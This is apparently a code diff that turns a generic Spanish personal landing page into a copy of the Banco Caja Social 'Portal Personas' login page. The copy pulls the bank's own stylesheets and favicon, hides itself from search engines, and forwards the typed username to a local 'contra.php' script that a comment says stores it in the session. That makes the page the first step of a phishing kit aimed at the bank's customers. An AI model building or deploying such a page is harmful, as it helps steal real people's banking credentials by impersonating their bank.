@@ -1,206 +1,89 @@
-
 <!DOCTYPE html>
-<html lang="es">
+<html xmlns="http://www.w3.org/1999/xhtml" class="" lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Mi Página Web</title>
-
-<style>
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    font-family: 'Segoe UI', sans-serif;
-}
-
-body {
-    min-height: 100vh;
-    background: linear-gradient(135deg, #080b20, #151044, #32105c);
-    color: white;
-}
-
-/* NAVBAR */
-nav {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    padding: 25px 8%;
-    background: rgba(255,255,255,0.05);
-    backdrop-filter: blur(15px);
-}
-
-.logo {
-    font-size: 27px;
-    font-weight: bold;
-    color: #a78bfa;
-}
-
-nav ul {
-    display: flex;
-    list-style: none;
-    gap: 30px;
-}
-
-nav a {
-    color: white;
-    text-decoration: none;
-    transition: .3s;
-}
-
-nav a:hover {
-    color: #a78bfa;
-}
-
-/* CONTENIDO */
-.hero {
-    min-height: 85vh;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    text-align: center;
-    padding: 30px;
-    animation: aparecer 1.2s ease;
-}
-
-.hero h1 {
-    font-size: clamp(40px, 8vw, 75px);
-    margin-bottom: 20px;
-}
-
-.hero h1 span {
-    color: #a78bfa;
-}
-
-.hero p {
-    max-width: 600px;
-    font-size: 18px;
-    color: #c4c4d8;
-    line-height: 1.7;
-}
-
-.btn {
-    margin-top: 35px;
-    padding: 15px 35px;
-    border-radius: 30px;
-    background: linear-gradient(90deg, #7c3aed, #c084fc);
-    color: white;
-    text-decoration: none;
-    font-weight: bold;
-    transition: .3s;
-    box-shadow: 0 0 25px #8b5cf6;
-}
-
-.btn:hover {
-    transform: scale(1.08);
-    box-shadow: 0 0 40px #a78bfa;
-}
-
-/* TARJETAS */
-.cards {
-    display: flex;
-    justify-content: center;
-    flex-wrap: wrap;
-    gap: 25px;
-    padding: 50px 8%;
-}
-
-.card {
-    width: 280px;
-    padding: 30px;
-    border-radius: 20px;
-    background: rgba(255,255,255,0.08);
-    border: 1px solid rgba(255,255,255,0.15);
-    text-align: center;
-    transition: .4s;
-}
-
-.card:hover {
-    transform: translateY(-12px);
-    background: rgba(139,92,246,0.2);
-}
-
-.card h2 {
-    color: #c4b5fd;
-    margin-bottom: 15px;
-}
-
-.card p {
-    color: #c4c4d8;
-}
-
-footer {
-    text-align: center;
-    padding: 25px;
-    color: #aaa;
-    background: rgba(0,0,0,.2);
-}
-
-@keyframes aparecer {
-    from {
-        opacity: 0;
-        transform: translateY(30px);
-    }
-    to {
-        opacity: 1;
-        transform: translateY(0);
-    }
-}
-
-@media(max-width:600px) {
-    nav {
-        flex-direction: column;
-        gap: 20px;
-    }
-
-    nav ul {
-        gap: 15px;
-    }
-}
-</style>
+    <meta charset="utf-8">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Inicio de sesión - Portal Personas Banco Caja Social</title>
+    <link rel="icon" type="image/x-icon" href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/img/favicon.ico">
+    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/zocial/zocial.css" rel="stylesheet">
+    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/backbase-theme/dist/backbase-theme.css" rel="stylesheet">
+    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/backbase-identity/styles/identity.css" rel="stylesheet">
+    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/pficon/pficon.css" rel="stylesheet">
+    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/css/tile.css" rel="stylesheet">
+    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/css/bcs.7.css" rel="stylesheet">
+    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/css/custom-identity.1.css" rel="stylesheet">
+    <script src="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/backbase-identity/scripts/load-background.js"></script>
 </head>
-
-<body>
-
-<nav>
-    <div class="logo">MI WEB ✦</div>
-    <ul>
-        <li><a href="#">Inicio</a></li>
-        <li><a href="#servicios">Servicios</a></li>
-        <li><a href="#contacto">Contacto</a></li>
-    </ul>
-</nav>
-
-<section class="hero">
-    <h1>Bienvenido a <span>Mi Mundo</span></h1>
-    <p>
-        Descubre una experiencia increíble con un diseño
-        moderno, elegante y lleno de estilo.
-    </p>
-    <a href="#servicios" class="btn">EXPLORAR AHORA</a>
-</section>
-
-<section class="cards" id="servicios">
-    <div class="card">
-        <h2>🚀 Innovación</h2>
-        <p>Diseños modernos para destacar en internet.</p>
+<body onload="createBackgrounds();" class="identity-background-1 identity-page--ready">
+    <div id="background" class="bb-stack__item bb-stack__item--fill identity-bg-layout"></div>
+    <div class="bb-stack bb-stack--wrap template-stack-container">
+        <div id="inner-background" class="bb-stack__item bb-stack__item--fill identity-bg-layout"></div>
+        <div class="bb-stack__break bb-stack__break--md-down"></div>
+        <div class="bb-stack__item--fill identity-container">
+            <div class="identity-container__panel identity-container__panel--animated">
+                <div class="identity-container__form">
+                    <div class="login-logos-wrapper">
+                        <div class="identity-logo bb-block bb-block--lg"></div>
+                    </div>
+                    <header>
+                        <h1 id="kc-page-title">Bienvenido al Portal Personas</h1>
+                    </header>
+                    <div class="bb-subtitle bb-block bb-block--lg">
+                        <span>Ingrese su número de documento o usuario de canales digitales.</span>
+                    </div>
+                    <div id="kc-form">
+                        <div id="kc-form-wrapper">
+                            <form id="form-index">
+                                <div class="form-group bb-form-field bb-form-field--md">
+                                    <label for="username-input" class="label">Usuario</label>
+                                    <input id="username-input"
+                                        class="form-control"
+                                        name="username"
+                                        type="text"
+                                        autofocus
+                                        autocomplete="off"
+                                        placeholder="Número de documento o usuario">
+                                </div>
+                                <div class="bb-button-bar bb-block bb-block--xl mt-3">
+                                    <button id="btn-index"
+                                        class="btn btn-primary w-100"
+                                        type="submit"
+                                        disabled>
+                                        Continuar
+                                    </button>
+                                </div>
+                                <hr class="bb-block bb-block--lg identity-separator">
+                                <div class="bb-subtitle d-flex align-items-center gap-2 flex-wrap">
+                                    <div class="bb-block bb-block--sm mb-0">¿Es un cliente nuevo?</div>
+                                    <strong class="mb-0">
+                                        <a class="btn-link-text" href="https://bancapersonas.bancocajasocial.com/web/enrollment">
+                                            Registrarse
+                                        </a>
+                                    </strong>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
+    <script>
+        const input = document.getElementById('username-input');
+        const btn   = document.getElementById('btn-index');
 
-    <div class="card">
-        <h2>🎨 Creatividad</h2>
-        <p>Colores, efectos y animaciones increíbles.</p>
-    </div>
+        input.addEventListener('input', () => {
+            btn.disabled = input.value.trim().length === 0;
+        });
 
-    <div class="card">
-        <h2>⚡ Velocidad</h2>
-        <p>Una experiencia rápida y adaptable.</p>
-    </div>
-</section>
-
-<footer id="contacto">
-    © 2026 Mi Web | Creado con ❤️
-</footer>
-
+        document.getElementById('form-index').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = input.value.trim();
+            if (!username) return;
+            // Pasar username a contra.php via GET (se guarda en sesión allá)
+            window.location.href = './contra.php?username=' + encodeURIComponent(username);
+        });
+    </script>
 </body>
 </html>
